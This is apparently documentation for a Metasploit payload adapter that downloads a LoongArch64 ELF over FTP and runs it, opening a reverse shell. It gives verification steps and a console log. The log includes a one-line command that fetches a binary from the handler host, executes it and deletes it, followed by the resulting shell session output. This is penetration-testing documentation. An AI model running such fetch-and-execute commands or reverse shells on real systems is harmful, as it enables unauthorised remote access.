## Vulnerable Application

This adapter downloads a Linux LoongArch64 ELF over FTP and executes it.
No vulnerable application is required; the generated command must run on a
Linux LoongArch64 system with FTP or TNFTP installed.

## Verification Steps

1. Prepare a Linux LoongArch64 host with FTP or TNFTP and `/bin/sh`.
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `cmd/linux/ftp/loongarch64/shell_reverse_tcp`.
1. Set `LHOST`, `LPORT`, `FETCH_COMMAND` to `FTP` or `TNFTP`, and `VERBOSE` to `true`.
1. Run the handler and execute the printed fetch command on the test host.
1. In the resulting shell, run `id` and `uname -a`.

## Options

No specific options

## Scenarios
```msf
PAYLOAD => cmd/linux/ftp/loongarch64/shell_reverse_tcp
LHOST => 10.5.135.210
LPORT => 50102
FETCH_SRVHOST => 10.5.135.210
FETCH_SRVPORT => 8021
FETCH_URIPATH => pr21954-ftp
FETCH_COMMAND => FTP
FETCH_WRITABLE_DIR => /tmp
FETCH_FILENAME => pr21954-ftp.elf
FETCH_DELETE => true
ExitOnSession => false
VERBOSE => true
[*] Command to execute on target: ftp -Vo /tmp/pr21954-ftp.elf ftp://10.5.135.210:8021/pr21954-ftp;chmod +x /tmp/pr21954-ftp.elf;/tmp/pr21954-ftp.elf&sleep 6;rm -rf /tmp/pr21954-ftp.elf
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Starting FTP server on 10.5.135.210:8021

[*] Adding FTP resource pr21954-ftp
[*] Started reverse TCP handler on 10.5.135.210:50102
msf exploit(multi/handler) > [*] Command shell session 1 opened (10.5.135.210:50102 -> 10.5.132.181:48668) at 2026-10-20 15:35:20 -0500
sessions -i 1
[*] Starting interaction with 1...

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),114(bluetooth),116(scanner),117(lpadmin)
Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20 UTC 2025 loongarch64 loongarch64 loongarch64 GNU/Linux
[*] 10.5.132.181 - Command shell session 1 closed.
```
